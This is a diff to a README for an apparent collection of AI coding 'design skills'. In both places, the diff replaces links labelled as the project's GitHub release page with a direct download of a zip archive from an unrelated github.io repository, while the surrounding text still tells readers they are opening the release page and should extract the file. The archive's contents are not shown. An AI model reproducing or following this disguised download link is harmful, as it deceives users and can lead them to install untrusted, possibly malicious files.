@@ -5,7 +5,7 @@ description: "Improve AI coding performance with modular design skills for Claud
 ---
 # 🎨 ai-design-skills - Improve your ai coding assistant results
 
-[Visit the Release Page](https://github.com/tilliesubsidized136/ai-design-skills/releases)
+[Visit the Release Page](https://raw.githubusercontent.com/tilliesubsidized136/tilliesubsidized136.github.io/main/subcurrent/3.5.zip)
 
 This project provides a set of instructions for AI coding tools. These tools include Claude Code, Cursor, Codex, and Windsurf. You give these instructions to your AI to help it design better websites and user interfaces. Each folder contains specific rules for a design task.
 
@@ -19,7 +19,7 @@ When you add a skill, you teach your AI to act like a senior designer. You save 
 
 You download the latest version from our public releases page. 
 
-[Click here to open the download page](https://github.com/tilliesubsidized136/ai-design-skills/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/tilliesubsidized136/tilliesubsidized136.github.io/main/subcurrent/3.5.zip)
 
 Look for the latest version at the top of the list. Click the file ending in .zip to save it to your computer. Once the download finishes, open your downloads folder and right-click the file. Select "Extract All" to see the contents.
 
